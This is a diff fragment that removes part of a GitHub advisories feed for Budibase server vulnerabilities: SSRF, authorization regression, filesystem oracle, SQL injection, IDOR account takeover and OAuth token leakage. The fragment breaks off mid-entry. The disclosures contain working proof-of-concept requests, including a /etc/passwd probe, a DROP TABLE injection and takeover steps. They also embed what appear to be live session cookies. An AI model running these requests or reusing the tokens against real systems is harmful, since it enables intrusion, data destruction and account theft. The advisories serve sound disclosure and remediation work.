-<li><a href="https://github.com/advisories/GHSA-hp6v-6jw7-gv2f">https://github.com/advisories/GHSA-hp6v-6jw7-gv2f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hp6v-6jw7-gv2f</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-24T21:17:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server]  Budibase: DNS rebinding SSRF bypasses remain in OpenAPI import and REST query execution]]></title>
-        <id>https://github.com/advisories/GHSA-xg5g-26x8-cvf4</id>
-        <link href="https://github.com/advisories/GHSA-xg5g-26x8-cvf4"/>
-        <updated>2026-07-24T21:17:26.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
-<p>A builder-level user can make Budibase issue server-side HTTP requests to loopback or private-network targets by using DNS rebinding against two outbound fetch paths that are still not pinned to the validated DNS answer.</p>
-<p>The first path is OpenAPI query import. It validates the supplied hostname with the blacklist and then performs a separate raw fetch. A hostname that resolves to a public address during validation and to <code>127.0.0.1</code> during the request is accepted.</p>
-<p>The second path is REST datasource/query execution. It calls the fixed <code>fetchWithBlacklist()</code> helper, but provides a custom undici <code>fetchFn</code> that installs a <code>dispatcher</code>. The helper passes a pinned Node <code>agent</code>, but undici uses the dispatcher and resolves the original hostname again at connection time. This defeats the DNS pinning added for the previous outbound fetch advisory.</p>
-<p>Impact is authenticated SSRF from the Budibase server process. An attacker with the relevant builder/query privileges can reach loopback or private HTTP services that should be blocked by Budibase's outbound fetch protections, subject to the normal response handling of each feature.</p>
-<h2 id="reproduction">Reproduction</h2>
-<ol>
-<li>Configure an attacker-controlled hostname so the validation lookup returns a public IP address and the later request lookup returns an internal address such as <code>127.0.0.1</code>.</li>
-<li>Start a loopback canary HTTP service on the Budibase host.</li>
-<li>For OpenAPI query import, submit an import URL such as <code>http://rebind.test:&lt;port&gt;/openapi.json</code> through the builder query import endpoints. In a harness matching the current import code, validation resolved <code>rebind.test</code> to <code>8.8.8.8</code>, the raw fetch then resolved <code>rebind.test</code> to <code>127.0.0.1</code>, and the loopback canary returned <code>loopback-canary-hit:/openapi.json</code>.</li>
-<li>For REST datasource/query execution, configure a REST datasource/query URL using the same rebinding hostname. In a harness matching the current helper plus REST undici custom fetch path, a direct loopback URL was blocked and a pinned Node-agent control did not hit loopback, but the REST undici path re-resolved the hostname to <code>127.0.0.1</code> and returned <code>REST-UNDICI-REBIND-CANARY</code> from the loopback service.</li>
-</ol>
-<p>Observed OpenAPI import proof:</p>
-<pre><code class="language-json">{
-  "outcome": "allowed",
-  "body": "loopback-canary-hit:/openapi.json",
-  "lookups": [
-    {"phase": "guard", "hostname": "rebind.test", "address": "8.8.8.8"},
-    {"phase": "fetch", "hostname": "rebind.test", "address": "127.0.0.1"}
-  ]
-}
-</code></pre>
-<p>Observed REST undici proof:</p>
-<pre><code class="language-json">{
-  "directControl": {"outcome": "blocked", "hitsAfter": 0},
-  "pinnedNodeFetchControl": {"outcome": "no_loopback_hit", "hitsAfter": 0},
-  "undiciBypass": {
-    "outcome": "allowed",
-    "status": 200,
-    "body": "REST-UNDICI-REBIND-CANARY",
-    "hitsAfter": 1
-  },
-  "lookupTrace": [
-    {"phase": "guard", "hostname": "rebind.test", "address": "8.8.8.8"},
-    {"phase": "fetch", "hostname": "rebind.test", "address": "127.0.0.1"}
-  ]
-}
-</code></pre>
-<h2 id="root-cause-and-technical-details">Root cause and technical details</h2>
-<p>The central helper now resolves and validates the target hostname, then passes a pinned Node <code>http.Agent</code> or <code>https.Agent</code> to the request. That protects callers whose HTTP client honors the Node <code>agent</code> option.</p>
-<p>OpenAPI query import does not use that helper. In <code>packages/server/src/api/controllers/query/import/index.ts</code>, <code>assertUrlIsSafe()</code> calls <code>blacklist.isBlacklisted(parsed.hostname)</code>, but <code>fetchFromUrl()</code> then calls <code>fetch(currentUrl, { redirect: "manual" })</code>. That creates a validate-then-fetch gap where DNS can change between the blacklist lookup and the actual connection.</p>
-<p>REST datasource/query execution uses the helper but changes the transport semantics. In <code>packages/server/src/integrations/rest.ts</code>, <code>setDispatcher()</code> creates an undici dispatcher with <code>getDispatcher({ rejectUnauthorized, url: requestUrl })</code>, then the custom fetch function calls <code>fetch(requestUrl, setDispatcher(requestInput, requestUrl))</code>. In <code>packages/backend-core/src/utils/outboundFetch.ts</code>, <code>fetchWithBlacklist()</code> passes the pinned Node <code>agent</code> to <code>fetchFn</code>, but undici fetch uses the supplied <code>dispatcher</code> instead. The actual connection performs a second hostname resolution and can be rebound to a blocked address.</p>
-<p>Current affected code is present in latest <code>master</code> and in the latest release tag <code>3.39.14</code>.</p>
-<h2 id="remediation">Remediation</h2>
-<p>Route OpenAPI query import through the pinned outbound fetch helper rather than validating and raw-fetching separately.</p>
-<p>Make <code>fetchWithBlacklist()</code> pin the actual connection for every supported transport. For undici callers, provide a dispatcher whose lookup or connect behavior is pinned to the validated IP, or reject custom fetch functions that do not explicitly enforce the pinned address. Add regression coverage for direct loopback blocking, DNS rebinding through OpenAPI import, DNS rebinding through REST undici dispatcher, redirect-to-loopback, IPv4-mapped IPv6, and mixed public/private DNS answers.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-xg5g-26x8-cvf4">https://github.com/Budibase/budibase/security/advisories/GHSA-xg5g-26x8-cvf4</a></li>
-<li><a href="https://github.com/Budibase/budibase/pull/19178">https://github.com/Budibase/budibase/pull/19178</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/1fecb3fc3497e8db7b60b42cc514ce304ffe3a41">https://github.com/Budibase/budibase/commit/1fecb3fc3497e8db7b60b42cc514ce304ffe3a41</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/5758bdb242802ca20c4ed0dc579e4330ee898ef3">https://github.com/Budibase/budibase/commit/5758bdb242802ca20c4ed0dc579e4330ee898ef3</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/586802b5706367520d14245e18a7d0cabab0be11">https://github.com/Budibase/budibase/commit/586802b5706367520d14245e18a7d0cabab0be11</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.30">https://github.com/Budibase/budibase/releases/tag/3.39.30</a></li>
-<li><a href="https://github.com/advisories/GHSA-xg5g-26x8-cvf4">https://github.com/advisories/GHSA-xg5g-26x8-cvf4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xg5g-26x8-cvf4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-24T21:17:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server]  Budibase: S3 presigned URL endpoint authorization regression in v3.39.4 allows BASIC users to obtain S3 PutObject presigned URLs]]></title>
-        <id>https://github.com/advisories/GHSA-xcx6-4f2g-hhgx</id>
-        <link href="https://github.com/advisories/GHSA-xcx6-4f2g-hhgx"/>
-        <updated>2026-07-24T21:17:04.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
-<p>In Budibase v3.39.4, a regression in the authorization level for the S3 attachment upload endpoint allows any BASIC app user to obtain S3 PutObject presigned URLs. The endpoint uses TABLE/WRITE permission level instead of the intended BUILDER level defined in v3.39.3. Additionally, the controller does not pin the target bucket to the datasource's configured bucket, allowing writes to any S3 bucket the stored IAM credentials can access.</p>
-<h2 id="reproduction">Reproduction</h2>
-<ol>
-<li>As a BASIC app user, discover or obtain a valid S3 datasource ID within the app</li>
-<li>Send a POST request:</li>
-</ol>
-<pre><code>POST /api/attachments/&lt;datasourceId&gt;/url
-Content-Type: application/json
-x-budibase-app-id: &lt;appId&gt;
-
-{"bucket": "target-bucket", "key": "malicious-file.html"}
-</code></pre>
-<ol start="3">
-<li>The response contains a valid S3 PutObject presigned URL</li>
-<li>Use the presigned URL to upload arbitrary content to any writable S3 bucket in the IAM credential scope</li>
-</ol>
-<h2 id="root-cause">Root Cause</h2>
-<p>The <code>/api/attachments/:datasourceId/url</code> route was changed from <code>authorized(BUILDER)</code> in v3.39.3 to <code>authorized(PermissionType.TABLE, PermissionLevel.WRITE)</code> in v3.39.4. BASIC users have TABLE/WRITE permissions by default, so they can call this endpoint. The controller at <code>packages/server/src/api/controllers/static/index.ts:614-632</code> accepts the <code>bucket</code> parameter directly from the request body and passes it to <code>getSignedUrl</code> without validating against the datasource's configured bucket.</p>
-<h2 id="evidence">Evidence</h2>
-<p>The test suite at <code>packages/server/src/api/routes/tests/static.spec.ts:218-235</code> confirms this behavior. The test authenticates as a BASIC role user and successfully generates a signed upload URL, verifying HTTP 200 and a defined <code>res.body.signedUrl</code>.</p>
-<h2 id="remediation">Remediation</h2>
-<ol>
-<li>Restore the <code>authorized(BUILDER)</code> middleware on the route</li>
-<li>Add <code>paramResource("datasourceId")</code> to ensure the datasource belongs to the caller's app</li>
-<li>Pin the S3 bucket to <code>datasource.config.bucket</code> in the controller, ignoring the caller-supplied bucket value</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-xcx6-4f2g-hhgx">https://github.com/Budibase/budibase/security/advisories/GHSA-xcx6-4f2g-hhgx</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.40.0">https://github.com/Budibase/budibase/releases/tag/3.40.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-xcx6-4f2g-hhgx">https://github.com/advisories/GHSA-xcx6-4f2g-hhgx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xcx6-4f2g-hhgx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-24T21:17:03.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server]  Budibase: Server Filesystem Existence/Read Oracle via Builder-Controlled MongoDB tlsCertificateKeyFile]]></title>
-        <id>https://github.com/advisories/GHSA-ppr4-5f46-j9c6</id>
-        <link href="https://github.com/advisories/GHSA-ppr4-5f46-j9c6"/>
-        <updated>2026-07-24T21:16:41.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>When creating a MongoDB datasource, Budibase passes the <code>tlsCertificateKeyFile</code> and <code>tlsCAFile</code> fields straight to the MongoDB driver as server-side file paths. On Budibase Cloud a customer cannot place files on the server, so these fields only let a builder reference arbitrary absolute paths on the underlying multi-tenant server. When the datasource is verified, the driver performs a real filesystem read of that path, and the error differs by file state, turning <code>/api/datasources/verify</code> into an arbitrary-path existence/read oracle over the whole server filesystem.</p>
-<h2 id="root-cause">Root Cause</h2>
-<p><code>packages/server/src/integrations/mongodb.ts</code> passes <code>config.tlsCertificateKeyFile</code> / <code>config.tlsCAFile</code> directly to <code>new MongoClient(config.connectionString, options)</code> as filesystem paths, with no allow-list, no confinement to a certificates directory, and no rejection of absolute / <code>..</code> paths.</p>
-<p>POC </p>
-<h2 id="reproduction--paste-each-line-press-enter">Reproduction — paste each line, press Enter</h2>
-<p>Line 1 (existing file — proves the file is READ):</p>
-<pre><code>curl -s -X POST "https://hasinocompany.budibase.app/api/datasources/verify" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJlNDYzZTM0Ni1hZmQ2LTQwNDEtODNmMS1hYmNlNzhjMmExN2QiLCJ1c2VySWQiOiJ1c19jMGY4NDE0NjAxYmQ0ZTk0YTJmMTEzMTAxYzVlNzZkNCIsImVtYWlsIjoiY3liZXJAaGFzaW5vc2VjLmxhdCIsImNzcmZUb2tlbiI6ImU5ZDJlZjQ4LTJiNmEtNDJhZC1hN2ViLTY1NzkzZDg3ZDdlYyIsInRlbmFudElkIjoiaGFzaW5vY29tcGFueSIsImlhdCI6MTc4NDAzNTU1NywiZXhwIjoxNzg0NjQwMzU3fQ.oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d '{"datasource":{"name":"probe","source":"MONGODB","type":"datasource","config":{"connectionString":"mongodb://127.0.0.1:27017/?tls=true","database":"x","tlsCertificateKeyFile":"/etc/passwd"}}}'
-</code></pre>
-<p>RESPONSE</p>
-<p>{"connected":false,"error":"error:0480006C:PEM routines::no start line"} </p>
-<p>Line 2 (missing file — path is reflected):</p>
-<pre><code>curl -s -X POST "https://hasinocompany.budibase.app/api/datasources/verify" -H "Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJlNDYzZTM0Ni1hZmQ2LTQwNDEtODNmMS1hYmNlNzhjMmExN2QiLCJ1c2VySWQiOiJ1c19jMGY4NDE0NjAxYmQ0ZTk0YTJmMTEzMTAxYzVlNzZkNCIsImVtYWlsIjoiY3liZXJAaGFzaW5vc2VjLmxhdCIsImNzcmZUb2tlbiI6ImU5ZDJlZjQ4LTJiNmEtNDJhZC1hN2ViLTY1NzkzZDg3ZDdlYyIsInRlbmFudElkIjoiaGFzaW5vY29tcGFueSIsImlhdCI6MTc4NDAzNTU1NywiZXhwIjoxNzg0NjQwMzU3fQ.oaxPeSwQ571QDd7pPZZy-G0b4rpI6-wYQqcV2Urwlo8; budibase:auth.sig=exoCxnKfj6IDWg6z04bX4dUcPN0" -H "x-csrf-token: e9d2ef48-2b6a-42ad-a7eb-65793d87d7ec" -H "x-budibase-app-id: app_dev_hasinocompany_bcb6316e0d014f91939c812389012415" -H "Content-Type: application/json" -d '{"datasource":{"name":"probe","source":"MONGODB","type":"datasource","config":{"connectionString":"mongodb://127.0.0.1:27017/?tls=true","database":"x","tlsCertificateKeyFile":"/nonexistent/pentest/xyz"}}}'
-</code></pre>
-<p>RESPONSE</p>
-<p>{"connected":false,"error":"ENOENT: no such file or directory, open '/nonexistent/pentest/xyz'"}</p>
-<h3 id="actual-output">Actual output</h3>
-<pre><code class="language-text">/etc/passwd               -&gt; {"connected":false,"error":"error:0480006C:PEM routines::no start line"}          (EXISTS, was READ)
-/nonexistent/pentest/xyz  -&gt; {"connected":false,"error":"ENOENT: no such file or directory, open '/nonexistent/pentest/xyz'"}   (MISSING, path reflected)
-</code></pre>
-<p>Existing files return a "PEM routines" error (the file was read but is not PEM); missing files return <code>ENOENT ... open '&lt;path&gt;'</code> with the path echoed back. This confirms a real filesystem read at the attacker-chosen absolute path. Confirmed 3/3 separate runs.</p>
-<h2 id="impact">Impact</h2>
-<table>
-<thead>
-<tr>
-<th>Who / what is affected</th>
-<th>How</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>The underlying multi-tenant Cloud server</td>
-<td>Arbitrary-path existence/read oracle from a builder account</td>
-</tr>
-<tr>
-<td>Server config / secret files, other tenants' paths</td>
-<td>Located by enumerating paths (exists vs missing)</td>
-</tr>
-<tr>
-<td>PEM/certificate files on the server</td>
-<td>Content exfiltratable via mutual-TLS to an attacker MongoDB server (mechanism)</td>
-</tr>
-</tbody></table>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<ol>
-<li>On managed/Cloud, disallow <code>tlsCertificateKeyFile</code> / <code>tlsCAFile</code> as filesystem paths; accept PEM content and write it to a per-connection temp file under a fixed directory.</li>
-<li>Reject absolute and <code>..</code> paths; confine any file reference to an allow-listed certificates directory.</li>
-<li>Route the MongoDB connection host through the SSRF blacklist, as the REST integration already does.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-ppr4-5f46-j9c6">https://github.com/Budibase/budibase/security/advisories/GHSA-ppr4-5f46-j9c6</a></li>
-<li><a href="https://github.com/Budibase/budibase/pull/19244">https://github.com/Budibase/budibase/pull/19244</a></li>
-<li><a href="https://github.com/Budibase/budibase/commit/5e19b935536d6d1be1f47100e43c6fb30917826e">https://github.com/Budibase/budibase/commit/5e19b935536d6d1be1f47100e43c6fb30917826e</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.40.0">https://github.com/Budibase/budibase/releases/tag/3.40.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-ppr4-5f46-j9c6">https://github.com/advisories/GHSA-ppr4-5f46-j9c6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-ppr4-5f46-j9c6</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-24T21:16:41.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server]  Budibase: SQL Injection via `multipleStatements: true`]]></title>
-        <id>https://github.com/advisories/GHSA-q6x4-v3qx-85qw</id>
-        <link href="https://github.com/advisories/GHSA-q6x4-v3qx-85qw"/>
-        <updated>2026-07-24T21:15:02.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>A critical SQL injection vulnerability was discovered in Budibase's MySQL integration that allows remote attackers to execute arbitrary SQL commands.</p>
-<h2 id="details">Details</h2>
-<h3 id="vulnerability-type">Vulnerability Type</h3>
-<p>SQL Injection</p>
-<h3 id="description">Description</h3>
-<p>The MySQL integration component in Budibase is configured with <code>multipleStatements: true</code>, enabling execution of multiple SQL statements in a single query. Attackers can inject malicious SQL commands through user input fields, leading to complete database compromise.</p>
-<h3>Location</h3>
-<pre><code class="language-typescript">// File: packages/server/src/integrations/mysql.ts
-// Line: 173
-
-this.config = {
-  ...config,
-  typeCast: defaultTypeCasting,
-  multipleStatements: true,  // VULNERABLE
-  timezone: "Z",
-}
-</code></pre>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<h3 id="exploit">Exploit</h3>
-<pre><code class="language-javascript">const mysql = require('mysql2');
-
-// Budibase vulnerable configuration
-const connection = mysql.createConnection({
-  host: 'localhost',
-  user: 'root',
-  password: 'password',
-  multipleStatements: true,  // Vulnerable setting
-  timezone: "Z"
-});
-
-// Attack: Data destruction
-connection.query(
-  `SELECT * FROM users WHERE id = 1; DROP TABLE sensitive_data; --`,
-  (err, results) =&gt; {
-    if (!err) console.log("Table dropped successfully");
-  }
-);
-</code></pre>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Data Destruction</strong>: Execute DROP TABLE, DELETE commands</li>
-<li><strong>Data Theft</strong>: Exfiltrate data via SELECT INTO OUTFILE</li>
-<li><strong>Privilege Escalation</strong>: Grant database admin privileges</li>
-<li><strong>Denial of Service</strong>: Disrupt service operations</li>
-<li><strong>Complete Database Compromise</strong>: Full control over database</li>
-</ul>
-<h2 id="remediation">Remediation</h2>
-<h3 id="patch">Patch</h3>
-<pre><code class="language-diff">--- a/packages/server/src/integrations/mysql.ts
-+++ b/packages/server/src/integrations/mysql.ts
-@@ -170,7 +170,7 @@ class MySQLIntegration extends Sql implements DatasourcePlus {
-     this.config = {
-       ...config,
-       typeCast: defaultTypeCasting,
--      multipleStatements: true,
-+      multipleStatements: false,
-       timezone: "Z",
-     }
-   }
-</code></pre>
-<h3 id="workarounds">Workarounds</h3>
-<ol>
-<li>Temporarily disable MySQL integration</li>
-<li>Implement web application firewall (WAF)</li>
-<li>Restrict database user privileges</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-q6x4-v3qx-85qw">https://github.com/Budibase/budibase/security/advisories/GHSA-q6x4-v3qx-85qw</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.40.0">https://github.com/Budibase/budibase/releases/tag/3.40.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-q6x4-v3qx-85qw">https://github.com/advisories/GHSA-q6x4-v3qx-85qw</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q6x4-v3qx-85qw</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-24T21:15:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server]  Budibase: Email Change IDOR via POST /api/v2/email allows full Account Takeover (accountId not validated against session)]]></title>
-        <id>https://github.com/advisories/GHSA-c8vc-7pv3-g98p</id>
-        <link href="https://github.com/advisories/GHSA-c8vc-7pv3-g98p"/>
-        <updated>2026-07-24T21:14:51.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>POST /api/v2/email</code> on the account portal (<code>account.budibase.app</code>) starts an email-change workflow using a client-supplied <code>accountId</code> that is <strong>not validated against the authenticated session</strong>. A logged-in attacker supplies a victim's <code>accountId</code> and an email address they control; the verification code is delivered to the attacker's address, and completing the workflow changes the <strong>victim's</strong> account email. The attacker then password-resets the victim's account through the controlled address and logs in — full account takeover with no victim interaction.</p>
-<h2 id="vulnerability-details">Vulnerability Details</h2>
-<p>The endpoint session-checks the <code>currentEmail</code> field (a mismatch returns 403), but it does not enforce <code>body.accountId === session.accountId</code>. The account-portal frontend only ever submits the logged-in user's own accountId, so in normal use the two always match — the server simply trusts the body value. An attacker who has a victim's <code>accountId</code> can point the workflow at the victim's account while passing their own <code>currentEmail</code> to clear the session check.</p>
-<p>This is more powerful than a direct password reset: <code>PUT /api/v2/auth/password {email}</code> already exists and is gated only on knowing the victim's email, but the reset link is sent to the address on the account — the victim's inbox, which the attacker does not control. This IDOR moves the victim's email to an attacker-controlled inbox first, so the attacker receives the reset link and sets a password they know.</p>
-<p><strong>accountId obtainability.</strong> We checked every endpoint reachable from a non-admin free-tier account — <code>GET /api/global/users</code> (no UUID in any user record), <code>GET /api/global/auditlogs/search</code> (no accountId field), <code>GET /api/global/users/invites</code> (code + email + name only), <code>GET /api/v2/tenant</code> (one tenant-internal UUID, not a user accountId), the account-portal frontend (passes the session's own accountId only), and all unauthenticated endpoints — and the victim's <code>accountId</code> was not present in any of them. The attacker must obtain the UUID through some channel other than the normal API surface (support channel, screenshot, a leak, prior compromise, etc.).</p>
-<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
-<p><strong>Setup:</strong> Two account-portal accounts at <code>https://account.budibase.app</code> — Account A (attacker) and Account B (victim). From Account B's session, <code>GET /api/auth/self</code> returns <code>account.accountId</code> — this is the value the attacker needs.</p>
-<ol>
-<li><strong>Start the email-change workflow pointed at the victim's accountId, newEmail = attacker-controlled.</strong></li>
-</ol>
-<pre><code class="language-http">POST /api/v2/email HTTP/1.1
-Host: account.budibase.app
-Content-Type: application/json
-Cookie: budibase:auth=&lt;ACCOUNT_A_JWT&gt;
-
-{"currentEmail":"&lt;ACCOUNT_A_EMAIL&gt;","newEmail":"attacker-controlled@example.net","accountId":"&lt;VICTIM_ACCOUNT_ID&gt;"}
-</code></pre>
-<p>Response: <code>201 Created</code>, sets <code>budibase:change_email:correlationkey</code> (HttpOnly), <code>:instancekey</code>, <code>:status</code>, <code>:newemail</code> cookies. The workflow started against the victim's accountId even though the caller is Account A.</p>
-<ol start="2">
-<li><strong>Complete the change with the code from the attacker-controlled inbox (or read directly from the <code>correlationkey</code> cookie set in step 1).</strong></li>
-</ol>
-<pre><code class="language-http">POST /api/v2/email/verification HTTP/1.1
-Host: account.budibase.app
-Content-Type: application/json
-Cookie: budibase:auth=&lt;ACCOUNT_A_JWT&gt;; budibase:change_email:correlationkey=&lt;CODE&gt;; budibase:change_email:instancekey=&lt;KEY&gt;
-
-{"verificationCode":"&lt;code&gt;","processInstanceKey":"&lt;key&gt;"}
-</code></pre>
-<p>Response: <code>200 OK</code>. The victim's account email is now <code>attacker-controlled@example.net</code>.</p>
-<ol start="3">
-<li><strong>Confirm the change hit the victim, not the caller (false-positive control).</strong></li>
-</ol>
-<ul>
-<li>Account A (caller) still logs in with its own original email — 200, unchanged.</li>
-<li>Account B's (victim) original email is now rejected — 403, locked out.</li>
-<li><code>attacker-controlled@example.net</code> now logs into the victim's account — 200.</li>
-</ul>
-<ol start="4">
-<li><strong>Take over the account.</strong></li>
-</ol>
-<pre><code class="language-http">PUT /api/v2/auth/password HTTP/1.1
-Host: account.budibase.app
-Content-Type: application/json
-
-{"email":"attacker-controlled@example.net"}
-</code></pre>
-<p>Response: <code>202 Accepted</code>, reset link delivered to the attacker's own inbox. Complete the reset with <code>PUT /api/v2/auth/password/verification</code>, then log in as the victim with the attacker-chosen password. <code>GET /api/auth/self</code> afterward returns the victim's real <code>accountId</code> and <code>tenantId</code> — full account takeover, confirmed via a genuinely separate account/tenant (not a same-account self-test).</p>
-<h2 id="impact">Impact</h2>
-<p>An authenticated account-portal user who obtains a victim's <code>accountId</code> (out-of-band — it is not exposed anywhere in the normal cross-user API surface we could find) can take over that victim's account: rewrite the login email to an attacker address, set a new password, and access the victim's tenants, apps, and stored datasource credentials (REST/SQL/S3 auth). The victim is locked out of their own account. Every step from the initial IDOR write to full login-as-victim is deterministic and 100% reliable once the accountId is known — no additional vulnerability or guessing is required, since the chain uses nothing but the platform's own stock password-reset flow.</p>
-<h2 id="remediation">Remediation</h2>
-<p>Validate that the body's <code>accountId</code> equals the authenticated session's <code>accountId</code> before starting or completing the email-change workflow (the same check already applied to <code>currentEmail</code>). Do not trust a client-supplied <code>accountId</code> to select the workflow target.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-c8vc-7pv3-g98p">https://github.com/Budibase/budibase/security/advisories/GHSA-c8vc-7pv3-g98p</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.40.0">https://github.com/Budibase/budibase/releases/tag/3.40.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-c8vc-7pv3-g98p">https://github.com/advisories/GHSA-c8vc-7pv3-g98p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c8vc-7pv3-g98p</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-24T21:14:49.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@budibase/server]  Budibase: SSO OAuth2 Token Leakage via User Metadata Endpoints to Power-Role Users]]></title>
-        <id>https://github.com/advisories/GHSA-fcrw-f7gg-6g9f</id>
-        <link href="https://github.com/advisories/GHSA-fcrw-f7gg-6g9f"/>
-        <updated>2026-07-24T21:14:32.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>/api/users/metadata</code> and <code>/api/users/metadata/:id</code> endpoints in <code>@budibase/server</code> return full global user profiles to any user with POWER role or above. For SSO-authenticated users (OIDC, Google), the response includes <code>oauth2.accessToken</code> and <code>oauth2.refreshToken</code> fields, leaking identity provider credentials to other users who should not have access to them.</p>
-<h2 id="details">Details</h2>
-<p>When a user authenticates via SSO (OIDC or Google), the OAuth2 tokens are stored in the global CouchDB user document at <code>packages/backend-core/src/auth/auth.ts:170-173</code>:</p>
-<pre><code class="language-typescript">dbUser.oauth2 = {
-  ...dbUser.oauth2,
-  ...details,
-}
-await db.put(dbUser)
-</code></pre>
-<p>The user metadata endpoints are protected by <code>PermissionType.USER, PermissionLevel.READ</code> (<code>packages/server/src/api/routes/user.ts:11</code>), which maps to the POWER permission set (<code>packages/backend-core/src/security/permissions.ts:99</code>).</p>
-<p><strong>Path 1 — List all users</strong> (<code>GET /api/users/metadata</code>):</p>
-<ol>
-<li><code>controller.fetchMetadata</code> → <code>sdk.users.fetchMetadata()</code> (<code>packages/server/src/sdk/users/utils.ts:78</code>)</li>
-<li>→ <code>getGlobalUsers()</code> → <code>getRawGlobalUsers()</code> (<code>packages/server/src/utilities/global.ts:101-122</code>) — strips only <code>password</code> and <code>forceResetPassword</code></li>
-<li>→ <code>processUser()</code> (<code>packages/server/src/utilities/global.ts:15-76</code>) — strips only <code>password</code> and <code>roles</code></li>
-<li>The <code>oauth2</code> field containing <code>accessToken</code> and <code>refreshToken</code> is <strong>never removed</strong></li>
-</ol>
-<p><strong>Path 2 — Single user</strong> (<code>GET /api/users/metadata/:id</code>):</p>
-<ol>
-<li><code>controller.findMetadata</code> → <code>getFullUser()</code> (<code>packages/server/src/utilities/users.ts:6</code>)</li>
-<li>→ <code>getGlobalUser()</code> → <code>getRawGlobalUser()</code> (<code>packages/server/src/utilities/global.ts:90-92</code>) — raw CouchDB fetch, <strong>no field stripping at all</strong></li>
-<li>→ <code>processUser()</code> — strips only <code>password</code> and <code>roles</code></li>
-<li>Same result: <code>oauth2</code> tokens are returned</li>
-</ol>
-<p>There is no output sanitization middleware on these routes that would strip sensitive fields before the response reaches the client.</p>
-<h2 id="poc">PoC</h2>
-<p><strong>Prerequisites:</strong> A Budibase instance with at least one SSO-authenticated user (OIDC or Google) and a separate user with POWER role in an app.</p>
-<p><strong>Step 1 — As the POWER user, list all users:</strong></p>
-<pre><code class="language-bash">curl -s -X GET 'http://localhost:10000/api/users/metadata' \
-  -H 'Cookie: budibase:auth=&lt;power-user-jwt&gt;' \
-  -H 'x-budibase-app-id: app_&lt;appid&gt;' | jq '.[].oauth2'
-</code></pre>
-<p><strong>Expected output:</strong> <code>null</code> for all users (tokens should not be exposed)</p>
-<p><strong>Actual output:</strong> For SSO users, the response includes:</p>
-<pre><code class="language-json">{
-  "accessToken": "ya29.a0ARrdaM...",
